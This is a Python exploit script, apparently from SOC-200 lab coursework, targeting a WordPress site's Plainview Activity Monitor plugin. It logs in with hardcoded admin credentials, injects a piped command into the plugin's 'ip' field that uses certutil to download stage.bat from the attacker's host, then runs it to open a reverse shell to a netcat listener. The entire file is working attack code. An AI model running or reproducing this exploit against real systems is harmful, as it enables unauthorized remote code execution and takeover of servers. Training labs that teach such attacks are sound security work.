#!/usr/bin/env python3
import requests
import sys
import os

def main():
    target_ip = sys.argv[1]
    source_ip = sys.argv[2]

    working_dir = "~/SOC-200/Windows_Server_Side_Attacks"
    regex = "[0-9]{1,3}(\.[0-9]{1,3}){3}"

    os.system(f"sed -Ei 's/{regex}/{source_ip}/g' {working_dir}/stage.bat {working_dir}/load.ps1") 

    wp_login = 'http://' + target_ip + '/wordpress/wp-login.php'
    wp_admin = 'http://' + target_ip + '/wordpress/wp-admin/'

    username = 'wpadmin'
    password = 'wppassword1'

    with requests.Session() as s:
        headers_iv = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
        data_iv = {
            'log':username, 'pwd':password, 'wp-submit':'Log In', 'redirect_to':wp_admin, 'testcookie':'1'
        }
        s.post(wp_login, headers=headers_iv, data=data_iv)

        plainview = wp_admin + 'admin.php?page=plainview_activity_monitor&tab=activity_tools'
        
        data_stage = (
           ('ip', (None, 't.co|certutil.exe -urlcache -f http://' + source_ip + ':8000/stage.bat stage.bat')),
           ('lookup', (None, 'Lookup'))
        )

        data_load = (
           ('ip', (None, 't.co|stage.bat')),
           ('lookup', (None, 'Lookup'))
        )
        print("Attempting to upload stage.bat using Plainview Activity Monitor...", end="")
        s.post(plainview, files=data_stage)
        print("success!")
        print("Now running stage.bat. check your netcat listener for a shell!")
        s.post(plainview, files=data_load)

if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print("Usage: python3 %s <target IP> <source IP>" % sys.argv[0])
        sys.exit(0)
    else:
        main()
